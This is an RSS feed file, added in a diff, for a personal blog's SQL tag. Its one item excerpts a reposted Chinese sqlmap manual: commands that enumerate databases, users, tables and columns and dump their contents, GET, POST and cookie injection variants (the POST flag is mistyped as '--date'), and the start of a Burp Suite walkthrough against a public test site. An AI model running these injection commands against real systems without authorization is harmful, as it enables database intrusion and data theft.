@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Sql on LZ&#39;s Blog</title>
+    <link>https://liuzheng.github.io/tags/sql/</link>
+    <description>Recent content in Sql on LZ&#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    
+	<atom:link href="https://liuzheng.github.io/tags/sql/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>[转]【tools】SQLMAP注入工具手册</title>
+      <link>https://liuzheng.github.io/before2018/2015-08-18-sql-injection/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://liuzheng.github.io/before2018/2015-08-18-sql-injection/</guid>
+      <description>转自:http://sh4dow.lofter.com/post/395c80_121497d
+基本的注入步骤： sqlmap -u &amp;quot;http://url/news?id=1&amp;quot; --dbs #查询所有数据库 sqlmap -u &amp;quot;http://url/news?id=1&amp;quot; --current-db #获取当前数据库名 sqlmap -u &amp;quot;http://url/news?id=1&amp;quot; --current-user #获取当前用户名 sqlmap -u &amp;quot;http://url/news?id=1&amp;quot; -D &amp;quot;db_name&amp;quot; --tables #获取表名 sqlmap -u &amp;quot;http://url/news?id=1&amp;quot; -D &amp;quot;db_name&amp;quot; -T &amp;quot;table_name&amp;quot; --columns #获取列名 sqlmap -u &amp;quot;http://url/news?id=1&amp;quot; -D &amp;quot;db_name&amp;quot; -T &amp;quot;table_name&amp;quot; -C &amp;quot;column_name&amp;quot; --dump #获取字段内容  注入请求选项使用：
+sqlmap -u &amp;quot;http://url/news?id=1&amp;quot; #get注入 sqlmap -u &amp;quot;http://url/news&amp;quot; --date &amp;quot;id=1&amp;quot; #post注入 sqlmap -u &amp;quot;http://url/news&amp;quot; --cookie &amp;quot;id=1&amp;quot; #cookie注入  结合BurpSuite拦截的POST表单注入： 浏览器打开目标地址 http://testasp.vulnweb.com/Login.asp
+配置burp代理(127.0.0.1:8080)以拦截请求
+点击login表单的submit按钮
+如下图，这时候Burp会拦截到了我们的登录POST请求</description>
+    </item>
+    
+  </channel>
+</rss>
